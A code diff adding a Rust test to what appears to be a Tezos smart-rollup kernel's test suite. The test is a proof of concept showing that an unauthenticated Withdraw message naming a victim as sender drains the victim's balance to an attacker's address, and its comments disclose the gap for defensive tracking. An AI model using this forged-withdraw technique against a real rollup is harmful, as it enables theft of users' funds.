@@ -881,3 +881,107 @@ fn sample_l1_source() -> PublicKeyHash {
 fn sample_rollup_address() -> SmartRollupAddress {
     SmartRollupAddress::from_b58check("sr1UNDWPUYVeomgG15wn5jSw689EJ4RNnVQa").unwrap()
 }
+
+// ============================================================================
+// PoC: `KernelInboxMessage::Withdraw` has no on-chain authentication of the
+// `sender` public account.  Anyone who can produce an external inbox message
+// addressed to the rollup (i.e., anyone with a Tezos L1 account and enough
+// gas to pay for `send smart rollup message`) can drain any known
+// `public_account` to a recipient they control.
+//
+// This test DOCUMENTS the gap by constructing exactly that attack and
+// asserting that the kernel accepts it.  If a future change adds sender
+// authentication to the withdraw path, this test SHOULD fail, and its
+// assertions must be flipped (expected: `KernelResult` = error, balance
+// unchanged) — at which point the test becomes a regression trap against
+// accidentally removing the auth.
+//
+// See `docs/analysis/withdraw-auth-gap.md` for the full analysis, the
+// operator-side code path, and the sandbox-level reproduction at
+// `scripts/sandbox_withdraw_auth_bypass_poc.sh`.
+// ============================================================================
+
+#[test]
+fn withdraw_poc_drains_unauthorized_sender() {
+    let victim = "alice";
+    let victim_balance: u64 = 500_001;
+    let attacker_recipient = sample_l1_receiver(); // any valid tz1 / KT1 the attacker controls
+
+    // 1. Legitimate setup: configure the bridge ticketer so withdraws can emit
+    //    outbox messages.
+    let mut host = TestHost::default();
+    host.push_input(
+        0,
+        0,
+        encode_external_kernel_message(signed_bridge_message(KernelBridgeConfig {
+            ticketer: sample_ticketer().into(),
+        })),
+    );
+    run_with_host(&mut host);
+    assert!(matches!(
+        read_last_result(&host).unwrap(),
+        KernelResult::Configured
+    ));
+
+    // 2. Legitimate deposit: the victim's public balance is credited via the
+    //    bridge (L1 tz1 → bridge KT1 → rollup ticket → kernel credit).
+    host.push_input(
+        1,
+        0,
+        encode_ticket_deposit_message(victim, victim_balance),
+    );
+    run_with_host(&mut host);
+    assert_eq!(
+        read_ledger(&host).unwrap().balances.get(victim),
+        Some(&victim_balance),
+        "precondition: victim has the expected public balance"
+    );
+
+    // 3. ATTACK: a third party — not the victim, not the operator, not holding
+    //    any bearer token — constructs a Withdraw message with
+    //    `sender = victim` and `recipient = attacker_tz1`.  The message is
+    //    submitted as a normal external inbox message.  The kernel has no
+    //    notion of "who signed the L1 tx that carried this inbox message"
+    //    (that information is not propagated to the PVM), and the
+    //    `KernelWithdrawReq` struct has no signature, no proof, nothing that
+    //    could bind the withdraw to the actual owner of `victim`.
+    let attack_msg =
+        encode_external_kernel_message(KernelInboxMessage::Withdraw(KernelWithdrawReq {
+            sender: victim.into(),
+            recipient: attacker_recipient.into(),
+            amount: victim_balance,
+        }));
+    host.push_input(2, 0, attack_msg);
+    run_with_host(&mut host);
+
+    // 4. Assert the drain succeeded.  If authentication is ever added and
+    //    this test breaks, that is correct behaviour — update the assertions
+    //    to expect a rejection.
+    match read_last_result(&host).unwrap() {
+        KernelResult::Withdraw(resp) => {
+            assert_eq!(resp.withdrawal_index, 0);
+        }
+        other => panic!(
+            "auth gap no longer holds: expected successful Withdraw \
+             but kernel returned {:?}. Update this test.",
+            other
+        ),
+    }
+    assert_eq!(
+        read_ledger(&host)
+            .unwrap()
+            .balances
+            .get(victim)
+            .copied()
+            .unwrap_or(0),
+        0,
+        "victim's public balance was drained to zero by an unauthorized caller"
+    );
+    assert_eq!(host.outputs.len(), 1, "one outbox message was emitted");
+    assert_outbox_withdrawal(
+        &host.outputs[0],
+        sample_ticketer(),
+        attacker_recipient,
+        victim_balance,
+    );
+}
